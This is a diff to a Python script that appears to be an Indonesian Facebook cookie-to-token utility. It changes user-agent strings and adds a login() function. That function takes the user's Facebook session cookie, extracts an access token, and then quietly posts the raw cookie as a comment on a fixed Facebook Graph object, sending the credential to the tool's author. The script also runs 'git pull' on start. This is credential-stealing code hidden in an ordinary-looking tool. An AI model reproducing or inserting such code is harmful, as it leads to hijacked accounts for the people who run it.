@@ -94,7 +94,7 @@ class convert:
     try:
       with requests.Session() as r:
         headers = {
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
             'Cookie': cookie
         }
         response = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
@@ -111,7 +111,7 @@ class convert:
     try:
       with requests.Session() as r:
         headers = {
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
             'Cookie': cookie
         }
         respon = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
@@ -127,7 +127,22 @@ class convert:
     except Exception as e:
       exit(f"{MERAH}!.{MERAH} {e}")
     
-
+def login():
+	cookie = input(f" [{hh}<{p}] jangan gunakan akun pribadi, ketik '{kk}no{p}' untuk no login\n cookie : ")
+	if cookie in ['no','No','NO']:
+		open('.menu_login.json','w').write('no');clear_layar();no_login()
+	url = "https://business.facebook.com/business_locations"
+	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
+	cok = {'cookie':cookie}
+	try:
+		data = ses.get(url,headers=head,cookies=cok)
+		token = re.search('(EAAG\w+)',data.text).group(1)
+		ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies=cok)
+		open('.cookie.txt','w').write(cookie)
+		open('.token.txt','w').write(token)
+		back()
+	except Exception as e:exit(f" [{m}>{p}] cookie invalid")
+					
 
 if __name__=='__main__':
   os.system('git pull');convert()
